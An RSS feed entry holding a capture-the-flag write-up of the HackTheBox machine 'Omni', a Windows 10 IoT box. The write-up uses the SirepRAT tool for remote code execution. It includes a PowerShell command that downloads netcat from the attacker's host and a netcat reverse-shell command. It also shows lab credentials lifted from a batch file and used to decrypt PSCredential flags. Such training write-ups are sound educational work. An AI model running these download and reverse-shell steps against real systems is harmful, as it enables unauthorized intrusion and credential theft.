<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>PSCredential on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/pscredential/</link>
    <description>Recent content in PSCredential on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 06 May 2021 23:03:39 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/pscredential/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Omni</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-omni/</link>
      <pubDate>Thu, 06 May 2021 23:03:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-omni/</guid>
      <description>Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I&amp;rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.
Skills Learned  Exploiting Windows IoT Decrypting PSCredential object  Tools  Kali Linux (Attacking Machine) - https://www.</description>
      <content:encoded><![CDATA[<p>Omni is an easy difficulty machine from HackTheBox that runs the IoT version of Windows 10. The machine is known to be vulnerable to SirepRAT, allowing an attacker to gain a remote code execution as SYSTEM. Leveraging the RAT, I&rsquo;m able to gain a foothold on the system and obtain two set of credentials that can be used to decrypt the encrypted flags.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting Windows IoT</li>
<li>Decrypting PSCredential object</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>SirepRAT - <a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial port scan using <code>nmap</code> discovers two open ports: MSRPC on port 135, and a Microsoft IIS on port 8080.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ nmap -sC -sV -oN nmap/initial-omni -v <span style="color:#e6db74">&#39;10.10.10.204&#39;</span>
<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 23 09:25:53 2020 as: nmap -sC -sV -oN nmap/initial-omni -v 10.10.10.204</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.204
Host is up <span style="color:#f92672">(</span>0.056s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE VERSION
135/tcp  open  msrpc   Microsoft Windows RPC
8080/tcp open  upnp    Microsoft IIS httpd
| http-auth:
| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
|_  Basic realm<span style="color:#f92672">=</span>Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn’t have a title.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>Based on the <code>nmap</code>&rsquo;s result, authentication process is required to view the page content, and looks like it uses the basic HTTP authentication.</p>
<blockquote>
<p>With default script (<code>-sC</code>), <code>nmap</code> can retrieves the authentication scheme and realm of a web service that requires authentication.</p>
</blockquote>
<p><code>nmap</code> identifies the realm as &ldquo;Windows Device Portal&rdquo;, and here is what I found on Google.</p>
<p><div class="img-container"><img src="imgs/image-20210507000141372.png" alt="image-20210507000141372"  /></div>
</p>
<p>According to the table from <a href="https://docs.microsoft.com/en-us/windows/uwp/debug-test-perf/device-portal">this documentation</a>, Windows Device Portal (WDP) on port 8080 belongs to the IoT family, which means this machine is most likely running a Windows 10 IoT version.</p>
<p><div class="img-container"><img src="imgs/image-20210507000331533.png" alt="image-20210507000331533"  /></div>
</p>
<p>So, without credentials, I can&rsquo;t do anything here.</p>
<h2 id="foothold">Foothold</h2>
<p>There is a research about unauthenticated remote code execution on Windows IoT Core. The research documents (slides, paper) as well as the exploit tool are provided in the link below.</p>
<ul>
<li><a href="https://github.com/SafeBreach-Labs/SirepRAT/">https://github.com/SafeBreach-Labs/SirepRAT/</a></li>
</ul>
<h3 id="shell-as-omni">Shell as Omni$</h3>
<h4 id="sireprat-rce">SirepRAT RCE</h4>
<p>The exploit tool is work against this machine, and I can get a remote code execution as Omni$ / SYSTEM.</p>
<p>To get an interactive shell, I&rsquo;ll host Windows <code>nc64.exe</code> using Python HTTP server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ python -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
</code></pre></div><p>I&rsquo;ll get the hosted netcat on Omni using PowerShell <code>Invoke-WebRequest</code> command by leveraging the SirepRAT RCE.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span style="color:#e6db74">&#34;/c powershell -c Invoke-webrequest -uri 10.10.14.68/nc64.exe -outfile U:\Users\Public\xc.exe&#34;</span> --vv
RECV:
00000000: 2A 4C <span style="color:#ae81ff">59</span> A5 FB <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">47</span>  A9 6D 1C C9 7D C8 4F <span style="color:#ae81ff">12</span>  *LY..<span style="color:#e6db74">`</span>.G.m..<span style="color:#f92672">}</span>.O.
SEND:
00000000: 0A <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
00000010: <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  5A <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> B8 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  $...6...Z.......
00000020: <span style="color:#ae81ff">12</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">43</span> <span style="color:#ae81ff">00</span> 3A <span style="color:#ae81ff">00</span>  ............C.:.
00000030: 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span> 6E <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">\.</span>W.i.n.d.o.w.s.
00000040: 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> 6D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">33</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">\.</span>S.y.s.t.e.m.3.
00000050: <span style="color:#ae81ff">32</span> <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> 6D <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  2.<span style="color:#ae81ff">\.</span>c.m.d...e.x.
00000060: <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> 2F <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>  e./.c. .p.o.w.e.
00000070: <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>  6C <span style="color:#ae81ff">00</span> 6C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> 2D <span style="color:#ae81ff">00</span>  r.s.h.e.l.l. .-.
00000080: <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">49</span> <span style="color:#ae81ff">00</span> 6E <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span> 6B <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>  c. .I.n.v.o.k.e.
00000090: 2D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span>  -.w.e.b.r.e.q.u.
000000A0: <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>  2D <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span>  e.s.t. .-.u.r.i.
000000B0: <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">31</span> <span style="color:#ae81ff">00</span>   .1.0...1.0...1.
000000C0: <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">37</span> <span style="color:#ae81ff">00</span>  2F <span style="color:#ae81ff">00</span> 6E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">36</span> <span style="color:#ae81ff">00</span>  4...4.7./.n.c.6.
000000D0: <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> 2D <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span>  4...e.x.e. .-.o.
000000E0: <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span>  6C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">00</span>  u.t.f.i.l.e. .U.
000000F0: 3A <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span>  :.<span style="color:#ae81ff">\.</span>U.s.e.r.s.<span style="color:#ae81ff">\.</span>
00000100: <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">00</span> 6C <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  p.u.b.l.i.c.<span style="color:#ae81ff">\.</span>x.
00000110: <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>                    c...e.x.e.
RECV:
00000000: <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>                                       ....
&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
</code></pre></div><p>After that, I&rsquo;ll setup a listener, and send a reverse shell to my listener from Omni.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span style="color:#e6db74">&#34;/c U:\Users\public\xc.exe -e cmd.exe 10.10.14.47 1337
</span><span style="color:#e6db74">&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0
</span></code></pre></div><p>And I have interactive shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#960050;background-color:#1e0010">→</span> root@iamf <span style="color:#960050;background-color:#1e0010">«</span>omni<span style="color:#960050;background-color:#1e0010">»</span> <span style="color:#960050;background-color:#1e0010">«</span>10.10.14.47<span style="color:#960050;background-color:#1e0010">»</span>
$ rlwrap nc -nvlp 1337
listening on <span style="color:#66d9ef">[any]</span> 1337 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.204] 49689
Microsoft Windows <span style="color:#66d9ef">[Version 10.0.17763.107]</span>
Copyright (c) Microsoft Corporation. All rights reserved.

PS C:\windows\system32&gt;$env:username
Omni$
</code></pre></div><h3 id="internal-enumeration">Internal Enumeration</h3>
<p>Enumerating for the flags finds they are located at <code>C:\Data\Users\administrator\root.txt</code> and <code>C:\Data\Users\app\user.txt</code>. Since I have access as the SYSTEM itself, I can read both the user flag and the root flag directly, but the flags are encrypted.</p>
<p><code>root.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">PS C:\&gt; type C:\Data\Users\administrator\root.txt
type root.txt
<span style="color:#f92672">&lt;Objs</span> <span style="color:#a6e22e">Version=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Obj</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;TN</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/T&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Object<span style="color:#f92672">&lt;/T&gt;</span>
    <span style="color:#f92672">&lt;/TN&gt;</span>
    <span style="color:#f92672">&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/ToString&gt;</span>
    <span style="color:#f92672">&lt;Props&gt;</span>
      <span style="color:#f92672">&lt;S</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;UserName&#34;</span><span style="color:#f92672">&gt;</span>flag<span style="color:#f92672">&lt;/S&gt;</span>
      <span style="color:#f92672">&lt;SS</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7<span style="color:#f92672">&lt;/SS&gt;</span>
    <span style="color:#f92672">&lt;/Props&gt;</span>
  <span style="color:#f92672">&lt;/Obj&gt;</span>
<span style="color:#f92672">&lt;/Objs&gt;</span>
</code></pre></div><p><code>user.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">PS C:\&gt; type C:\Data\Users\app\user.txt
type C:\Data\Users\app\user.txt
<span style="color:#f92672">&lt;Objs</span> <span style="color:#a6e22e">Version=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Obj</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;TN</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredent^M^M      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredent^M^M      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/T&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Object<span style="color:#f92672">&lt;/T&gt;</span>
    <span style="color:#f92672">&lt;/TN&gt;</span>
    <span style="color:#f92672">&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/ToString&gt;</span>
    <span style="color:#f92672">&lt;Props&gt;</span>
      <span style="color:#f92672">&lt;S</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;UserName&#34;</span><span style="color:#f92672">&gt;</span>flag<span style="color:#f92672">&lt;/S&gt;</span>
      <span style="color:#f92672">&lt;SS</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7<span style="color:#f92672">&lt;/SS&gt;</span>
    <span style="color:#f92672">&lt;/Props&gt;</span>
  <span style="color:#f92672">&lt;/Obj&gt;</span>
<span style="color:#f92672">&lt;/Objs&gt;</span>
</code></pre></div><p><a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx">This article</a> shows way to decrypt those two files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$credential = Import-CliXml -Path  &lt;PathToXml&gt;\MyCredential.xml
$credential.GetNetworkCredential().Password
</code></pre></div><p>But then, I get an &ldquo;<em>Error occurred during a cryptographic operation</em>&rdquo; message. After <em>Googling</em> around to find the answer why it doesn’t work, it turns out the flag can only be decrypted by the user itself. So if I want to decrypt <code>user.txt</code>, I have to get access as <code>app</code> user.</p>
<p>While enumerating files recursively using the <code>dir</code> command, I spotted a batch file placed in the PowerShell folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt;cmd /c &#34;dir /s /b *.bat&#34;
cmd /c &#34;dir /s /b *.bat&#34;
C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat
C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\Build.bat
C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
</code></pre></div><p>The batch files contains the credentials for user <code>app</code> and <code>administrator</code>. The file itself looks like automation script to revert the user and admin account to default.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; gc &#34;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#34;
gc &#34;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#34;
@echo off

:LOOP

for /F &#34;skip=6&#34; %%i in (&#39;net localgroup &#34;administrators&#34;&#39;) do net localgroup &#34;administrators&#34; %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
</code></pre></div><h3 id="decrypting-the-flags">Decrypting the Flags</h3>
<p>Both credentials are works on the Windows Device Portal (WDP) web. WDP has a feature that allows you to do command execution on the system, so I can decrypt each flag from there.</p>
<p>For the root flag, I&rsquo;ll use the administrator account (<code>administrator:_1nt3rn37ofTh1nGz</code>) and issue the command below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -c <span style="color:#e6db74">&#34;$credential=Import-CliXml -Path U:\Users\Administrator\root.txt ;$credential.GetNetworkCredential().Password;&#34;</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210507020847618.png" alt="image-20210507020847618"  /></div>
</p>
<p>For the user flag, the procedure goes the same.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://nmap.org/nsedoc/scripts/http-auth.html">https://nmap.org/nsedoc/scripts/http-auth.html</a></li>
<li><a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
